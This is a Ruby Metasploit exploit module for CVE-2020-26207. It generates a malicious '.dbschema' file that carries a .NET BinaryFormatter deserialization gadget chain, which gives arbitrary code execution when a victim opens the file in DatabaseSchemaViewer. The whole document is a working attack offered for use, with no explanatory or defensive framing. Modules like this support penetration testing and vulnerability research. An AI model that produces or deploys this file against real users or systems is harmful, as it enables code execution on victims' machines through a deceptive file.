class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name' => 'DatabaseSchemaViewer Deserialization',
      'Description' => %q{
       DatabaseSchemaViewer before version 2.7.4.3 is vulnerable to arbitrary 
       code execution if a user is tricked into opening a specially crafted 
       '.dbschema' file. 
      },
      'Author' =>
        [
        'mario ceballos',
        ],
      'License' => 'BSD_LICENSE',
      'References' =>
        [
          ['CVE', '2020-26207'],
        ],
      'Privileged' => false,
      'Platform' => %w{win},
      'Targets' =>
        [
          [ 'dbschemareader 2.7.3.2',
            'Arch' => ARCH_CMD,
            'Platform' => 'win',
          ],
        ],
      'DefaultTarget' => 0,
      'DefaultOptions' =>
        {
          'DisablePayloadHandler' => true
        },
      'DisclosureDate' => 'Oct 01 2020'))

    register_options(
      [
       OptString.new('FILENAME', [true, 'The file name.', 'lalo.dbschema']) 
      ]
    )
  end

  def exploit
   cmd = payload.encoded
   serialized_payload = serialized_payload = Msf::Util::DotNetDeserialization.generate(
     cmd,
     gadget_chain: :WindowsIdentity,
     formatter: :BinaryFormatter
   ) 
   print_status("Creating '#{datastore['FILENAME']}' file ...")
   file_create(serialized_payload)
  end
end
